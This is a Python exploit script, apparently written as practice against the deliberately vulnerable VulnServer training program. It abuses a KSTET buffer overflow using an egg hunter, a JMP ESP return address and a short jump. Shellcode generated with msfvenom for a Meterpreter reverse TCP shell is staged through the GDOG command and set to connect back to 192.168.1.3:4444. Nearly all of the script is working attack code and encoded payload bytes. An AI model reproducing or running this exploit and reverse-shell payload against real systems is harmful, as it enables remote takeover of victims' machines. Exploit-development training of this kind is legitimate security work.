# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in VulnServer. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.

# 625011DF - JMP ESP
# Egg: YCSC
# EGG Hunter : "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -b '\x00\x0A\x0D\xAB' -f python
# Sending shellcode with STATS command mangles it. Hence, using GDOG command to send shellcode to the application

import sys
import socket




s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

egg = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
buf = "\x90"*100
buf +=  "YCSCYCSC"
buf += "\xba\xe0\x75\x80\xb8\xd9\xce\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x56\x31\x53\x13\x03\x53\x13\x83\xc3\xe4\x97"
buf += "\x75\x44\x0c\xd5\x76\xb5\xcc\xba\xff\x50\xfd\xfa\x64"
buf += "\x10\xad\xca\xef\x74\x41\xa0\xa2\x6c\xd2\xc4\x6a\x82"
buf += "\x53\x62\x4d\xad\x64\xdf\xad\xac\xe6\x22\xe2\x0e\xd7"
buf += "\xec\xf7\x4f\x10\x10\xf5\x02\xc9\x5e\xa8\xb2\x7e\x2a"
buf += "\x71\x38\xcc\xba\xf1\xdd\x84\xbd\xd0\x73\x9f\xe7\xf2"
buf += "\x72\x4c\x9c\xba\x6c\x91\x99\x75\x06\x61\x55\x84\xce"
buf += "\xb8\x96\x2b\x2f\x75\x65\x35\x77\xb1\x96\x40\x81\xc2"
buf += "\x2b\x53\x56\xb9\xf7\xd6\x4d\x19\x73\x40\xaa\x98\x50"
buf += "\x17\x39\x96\x1d\x53\x65\xba\xa0\xb0\x1d\xc6\x29\x37"
buf += "\xf2\x4f\x69\x1c\xd6\x14\x29\x3d\x4f\xf0\x9c\x42\x8f"
buf += "\x5b\x40\xe7\xdb\x71\x95\x9a\x81\x1d\x5a\x97\x39\xdd"
buf += "\xf4\xa0\x4a\xef\x5b\x1b\xc5\x43\x13\x85\x12\xd2\x33"
buf += "\x36\xcc\x5c\x53\xc8\xed\x9c\x7d\x0f\xb9\xcc\x15\xa6"
buf += "\xc2\x87\xe5\x47\x17\x3d\xec\xdf\x58\x69\xf1\x1c\x31"
buf += "\x6b\xf2\x33\x9d\xe2\x14\x63\x4d\xa4\x88\xc4\x3d\x04"
buf += "\x79\xad\x57\x8b\xa6\xcd\x57\x46\xcf\x64\xb8\x3e\xa7"
buf += "\x10\x21\x1b\x33\x80\xae\xb6\x39\x82\x25\x32\xbd\x4d"
buf += "\xce\x37\xad\xba\xa9\xb7\x2d\x3b\x5c\xb7\x47\x3f\xf6"
buf += "\xe0\xff\x3d\x2f\xc6\x5f\xbd\x1a\x55\xa7\x41\xdb\x6f"
buf += "\xd3\x74\x49\xcf\x8b\x78\x9d\xcf\x4b\x2f\xf7\xcf\x23"
buf += "\x97\xa3\x9c\x56\xd8\x79\xb1\xca\x4d\x82\xe3\xbf\xc6"
buf += "\xea\x09\x99\x21\xb5\xf2\xcc\x31\xb2\x0c\x92\x1d\x1b"
buf += "\x64\x6c\x1e\x9b\x74\x06\x9e\xcb\x1c\xdd\xb1\xe4\xec"
buf += "\x1e\x18\xad\x64\x94\xcd\x1f\x15\xa9\xc7\xfe\x8b\xaa"
buf += "\xe4\xda\x3c\xd0\x85\xdd\xbd\x25\x8c\xb9\xbe\x25\xb0"
buf += "\xbf\x83\xf3\x89\xb5\xc2\xc7\xad\xc6\x71\x65\x87\x4c"
buf += "\x79\x39\xd7\x44"



evilString = "/.:/" + "\x90" * 30 + egg + "\x90"*4 + "\xDF\x11\x50\x62" + "\x90"*4 + "\xeb\xC2" "\x90" * 50 + "\x90" * 5000 

command1 = "GDOG " + buf
command2 = "KSTET " + evilString

s.connect(('192.168.1.4',9999))
s.recv(1024)
s.send(command1)
s.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.1.4',9999))
s.recv(1024)
s.send(command2)
s.close()
